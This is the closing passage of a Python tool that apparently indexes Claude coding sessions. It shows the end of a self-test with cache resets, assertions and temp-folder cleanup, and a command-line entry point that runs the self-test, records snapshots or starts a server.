    session("only", 0, rec(type="last-prompt", lastPrompt="ok"))
    _cache.clear()
    _scan_cache.update(at=0.0, data=None)
    bare = scan(force=True)[0]
    assert bare["origin"] is None and bare["chapters"] == [] and bare["prs"] == [], bare
    assert light(bare)["origin_prompt"] is None and light(bare)["pr_count"] == 0

    shutil.rmtree(root, ignore_errors=True)


if __name__ == "__main__":
    if "--selftest" in sys.argv:
        selftest()
    elif "--snapshot" in sys.argv:
        if not snap_dir_ok(scan(force=True)):
            sys.exit("Refusing to keep history in %s: it is inside ~/.claude, the registry, the plans "
                     "or a project. Set LIBRARY_DATA_DIR to a folder of its own." % DATA_DIR)
        if "--once" in sys.argv:
            n = snapshot(scan(force=True))
            print("%d %s recorded in %s" % (n, "change" if n == 1 else "changes", snap_db()))
        else:
            SNAPSHOTS = True
            serve()
    else:
        serve()
